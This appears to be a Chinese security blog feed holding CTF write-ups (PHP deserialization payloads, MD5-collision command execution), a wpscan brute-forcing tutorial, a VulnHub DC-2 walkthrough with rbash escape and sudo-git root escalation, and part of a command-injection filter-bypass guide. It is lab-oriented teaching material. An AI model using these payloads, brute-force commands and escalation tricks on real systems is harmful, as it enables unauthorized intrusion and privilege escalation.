~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5那里我们可以使用MD5碰撞，命令执行我们可以<code>ca\t /fl\ag</code>绕过</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200516180221.png" style="zoom:80%;"><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="writeup-7"><a href="#writeup-7" class="headerlink" title="writeup"></a>writeup</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一下代码大体思路，首先判断反序列化字符串是否符合规则，符合则反序列化，首先进入<code>__destruct()</code>函数，首先判断<code>$this-&gt;op</code>参数的值，然后将<code>$this-&gt;content</code>设置为空，最后进入<code>$this-&gt;process()</code>，根据<code>$this-&gt;op</code>的值判断进行写还是读操作</p><p>很明显写文件已经不可能了，因为把文件内容设置为空了，所以看看读文件，可以看到<code>__destruct()</code>里判断<code>$this-&gt;op</code>用的是<code>===</code>，而</p><p><code>process()</code>方法里的比较用的是<code>==</code>，我们可以用弱类型比较绕过:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;2&quot;</span>==<span class="number">2</span></span><br><span class="line"><span class="string">&quot;2&quot;</span>==<span class="string">&quot;2e0&quot;</span></span><br><span class="line"><span class="string">&quot;2&quot;</span>==<span class="string">&quot; 2e0&quot;</span></span><br></pre></td></tr></table></figure><p>最后就进入了<code>$this-&gt;read()</code>，但是由于各参数都是protected类型，生成的字符串有<code>\x00</code>,所以无法pass is_valid函数，php7.1+版本对属性类型不敏感，所以直接用public绕过，或者将<code>s</code>替换成<code>S</code>，并把<code>\x00</code>替换成<code>\00</code>，原理可以参见：</p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><p>构造exp，F12得到flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op = <span class="number">2</span>;</span><br><span class="line">$a-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$a-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$s = serialize($a);</span><br><span class="line">$s = str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;\00&#x27;</span>,$s);</span><br><span class="line">$s = str_replace(<span class="string">&#x27;s:&#x27;</span>,<span class="string">&#x27;S:&#x27;</span>,$s);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:12:&quot;Hello World!&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;</span></span><br><span class="line"><span class="comment">// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:13:&quot;Hello World!&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>上面四个payload都能读到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wpscan学习使用</title>
      <link href="2020/01/11/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/"/>
      <url>2020/01/11/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了wordpress漏洞扫描工具wpscan的使用!</p><a id="more"></a><h2 id="什么是wpscan"><a href="#什么是wpscan" class="headerlink" title="什么是wpscan?"></a>什么是wpscan?</h2><p>介绍<code>wpscan</code>之前应该先介绍一下<code>wordpress</code>!</p><p><code>Wordpress</code>作为三大建站模板之一，在全世界范围内有大量的用户,这也导致白帽子都会去跟踪 <code>WordPress</code>的安全问题，<code>Wordpress</code>自诞生起出现了很多漏洞，同样部分插件、主题也存在漏洞。于是<code>WPScan</code>应运而生，收集 <code>Wordpress</code>的各种漏洞，形成一个<code>Wordpress</code>专用扫描器。</p><p>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p><p>kali里默认集成该工具</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --update<span class="comment">#更新漏洞库</span></span><br><span class="line">wpscan -h<span class="comment">#查看帮助信息</span></span><br></pre></td></tr></table></figure><h3 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url]<span class="comment">#对wordpress站点扫描</span></span><br></pre></td></tr></table></figure><h3 id="枚举用户"><a href="#枚举用户" class="headerlink" title="枚举用户"></a>枚举用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url] --enumerate u<span class="comment">#枚举用户列表，--enumerate可用-u代替</span></span><br><span class="line">wpscan --url [wordpress url] -P [path to wordlist] -U [username to brute force] <span class="comment">#暴力破解指定用户名的密码，可加-t指定线程,--rua随机UA头</span></span><br></pre></td></tr></table></figure><h3 id="枚举主题"><a href="#枚举主题" class="headerlink" title="枚举主题"></a>枚举主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url] --enumerate t<span class="comment">#扫描主题</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate vt<span class="comment">#扫描主题漏洞</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate at<span class="comment">#扫描所有主题</span></span><br></pre></td></tr></table></figure><h3 id="枚举插件"><a href="#枚举插件" class="headerlink" title="枚举插件"></a>枚举插件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url] --enumerate p<span class="comment">#扫描插件</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate vp<span class="comment">#扫描插件漏洞</span></span><br><span class="line">wpscan --url [wordpress url] --enumerate ap<span class="comment">#扫描所有插件</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wpscan </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub之DC-2靶机</title>
      <link href="2020/01/01/vulnhub-dc-2/"/>
      <url>2020/01/01/vulnhub-dc-2/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了玩DC-2靶机的过程!</p><a id="more"></a><p>kali：192.168.17.146</p><p>靶机：192.168.17.131</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>这个靶机需要将<code>dc-2</code>的域名指向对应靶机ip</p><p>首先arp-scan</p><img src="/2020/01/01/vulnhub-dc-2/20200101221407.png" style="zoom:80%;"><p>改下<code>/etc/hosts</code>文件</p><img src="/2020/01/01/vulnhub-dc-2/20200101221624.png" style="zoom:80%;"><p>直接访问dc-2域名，得到flag1</p><img src="/2020/01/01/vulnhub-dc-2/20200101221736.png" style="zoom: 67%;"><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示用cewl生成字典爆破就会看到下一个flag，首先枚举一下用户，枚举出三个用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/枚举用户.png" style="zoom:80%;"><p>用cewl生成字典，cewl有很多用法，参见<a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w a.txt</span><br></pre></td></tr></table></figure><p>然后用wpscan爆破，分别将用户名和密码放到两个文件里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --passwords /root/Desktop/a.txt --usernames /root/Desktop/b.txt -t 100</span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/爆破用户密码.png" style="zoom:80%;"><p>跑出来两个账号密码，登陆一下,找到flag2</p><img src="/2020/01/01/vulnhub-dc-2/flag2.png" style="zoom: 67%;"><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>nmap扫描主机发现7744端口开放着服务，探测服务是ssh，登陆试一下吧</p><img src="/2020/01/01/vulnhub-dc-2/端口扫描.png" style="zoom:80%;"><img src="/2020/01/01/vulnhub-dc-2/服务探测.png" style="zoom:80%;"><p>登陆jerry好像登不上，换成tom登上了，ls看到flag3.txt</p><img src="/2020/01/01/vulnhub-dc-2/ssh登陆.png" style="zoom:80%;"><p>发现cat不了，rbash是一种受限制的shell，受限制的shell是限制了一个shell的部分命令,像cd、ls、echo,或者是限制了一些环境变量,诸如SHELL、PATH、USER。或者限制一些输出符,像&gt;、&gt;&gt;等</p><p>因此，想办法切换一下shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a<span class="comment">#切换shell</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/<span class="comment">#添加$PATH，cat和su都在/bin下</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin<span class="comment">#sudo在/usr/bin下</span></span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/flag3.png" style="zoom:80%;"><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>从flag3可以看出来，flag4应该在jerry用户home里</p><img src="/2020/01/01/vulnhub-dc-2/flag4.png" style="zoom:80%;"><h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>flag4提示我们用git，切换用户发现jerry可以直接使用git</p><img src="/2020/01/01/vulnhub-dc-2/切换用户.png" style="zoom:80%;"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p --<span class="built_in">help</span><span class="comment">#查看帮助信息</span></span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><img src="/2020/01/01/vulnhub-dc-2/thefinalflag.png" style="zoom: 80%;">]]></content>
      
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入及其绕过方式</title>
      <link href="2019/12/31/command-exec-bypass/"/>
      <url>2019/12/31/command-exec-bypass/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了命令注入中的一些绕过方式！</p><a id="more"></a><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><h3 id><a href="#" class="headerlink" title="|"></a>|</h3><p>管道符，连结上个指令的标准输出，做为下个指令的标准输入</p><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>用户有时候执行命令要花很长时间，可能会影响做其他事情。最好的方法是将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上<code>&amp;</code></p><h3 id="amp-amp-和"><a href="#amp-amp-和" class="headerlink" title="&amp;&amp;和||"></a>&amp;&amp;和||</h3><p><code>shell</code>在执行某个命令的时候，会返回一个返回值，该返回值保存在<code>shell</code>变量 <code>$?</code> 中。当 <code>$? == 0</code> 时，表示执行成功；当 <code>$? == 1</code> 时，表示执行失败。有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。<code>shell</code>提供了<code>&amp;&amp;</code>和<code>||</code>来实现命令执行控制的功能，<code>shell</code>将根据<code>&amp;&amp;</code>或<code>||</code>前面命令的返回值来控制其后面命令的执行</p><h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 ...]  </span><br></pre></td></tr></table></figure><ul><li>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</li><li>只有在<code>&amp;&amp;</code>左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code>右边的命令才会被执行</li><li>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行</li></ul><h4 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2 [|| command3 ...]  </span><br></pre></td></tr></table></figure><ul><li>命令之间使用 || 连接，实现逻辑或的功能。</li><li>只有在 || 左边的命令返回假（命令返回值 <code>$? == 1</code>），<code>||</code>右边的命令才会被执行。这和<code>c</code>语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</li><li>只要有一个命令返回真（命令返回值 <code>$? == 0</code>），后面的命令就不会被执行。</li></ul><h3 id="反引号"><a href="#反引号" class="headerlink" title="`反引号"></a>`反引号</h3><p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项</p><h3 id="‘单引号"><a href="#‘单引号" class="headerlink" title="‘单引号"></a>‘单引号</h3><p>被单引号括住的内容,将被视为单一字符串。在引号内的变量<code>$</code>符号将会失效，也就是说，将被视作一般符号处理。</p><h3 id="“双引号"><a href="#“双引号" class="headerlink" title="“双引号"></a>“双引号</h3><p>被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，但允许变量扩展 ，这点与单引号的处理方式不同</p><h3 id="指令群组"><a href="#指令群组" class="headerlink" title="()指令群组"></a>()指令群组</h3><p>格式为：(command1;command2[;command3…])</p><ul><li>一条命令需要独占一个物理行，如果需要将多条命令放在同一行，命令之间使用命令分隔符（;）分隔。执行的效果等同于多个独立的命令单独执行的效果。</li><li>表示在当前 shell 中将多个命令作为一个整体执行。需要注意的是，使用 () 括起来的命令在执行前面都不会切换当前工作目录，也就是说命令组合都是在当前工作目录下被执行的，尽管命令中有切换目录的命令。</li><li>命令组合常和命令执行控制结合起来使用。</li></ul><p>用括号将一串连续指令括起来，这种用法对<code>shell</code>来说，称为指令群组。如下面的例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">cd</span> ~ ; vcgh=`<span class="built_in">pwd</span>` ;<span class="built_in">echo</span> <span class="variable">$vcgh</span>)</span><br></pre></td></tr></table></figure><p><img src="/2019/12/31/command-exec-bypass/20191231154412.png"></p><h3 id="大括号"><a href="#大括号" class="headerlink" title="{}大括号"></a>{}大括号</h3><p>其实大括号有一种拼接字符串的用法，<code>&#123;xx,yy,zz,...&#125;</code>这种大括号的组合，常用在字串的组合上，来看个例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#123;userA,userB,userC&#125;-&#123;home,bin,data&#125;</span><br></pre></td></tr></table></figure><p>我们得到<code>userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data</code>文件夹。</p><p><img src="/2019/12/31/command-exec-bypass/20191231155709.png"></p><p>于是我们可以用来查看flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#123;/fl,/fla&#125;&#123;ag,g&#125;</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line">cat: /flg: No such file or directory</span><br><span class="line">cat: /flaag: No such file or directory</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><h3 id="中括号"><a href="#中括号" class="headerlink" title="[]中括号"></a>[]中括号</h3><p>这个符号在正则表达式中担任类似 “范围” 或 “集合” 的角色。</p><p><img src="/2019/12/31/command-exec-bypass/20191231160313.png"></p><h3 id="小括号，中括号，和大括号的区别"><a href="#小括号，中括号，和大括号的区别" class="headerlink" title="小括号，中括号，和大括号的区别"></a>小括号，中括号，和大括号的区别</h3><p>那么，下面又涉及到了一个问题，就是小括号，中括号，和大括号的区别。</p><ol><li>单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。把<code>command group</code>放在<code>subshell</code>去执行，也叫做<code>nested sub-shell</code>。</li><li>单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。花括号是在同一个 shell 內完成，也称为 <code>non-namedcommand group</code>。</li></ol><p>所以说，如果在shell里面执行“函数”，需要用到{}，实际上也就是一个命令群组么。<br>不过，根据实测，<code>test=$(ls 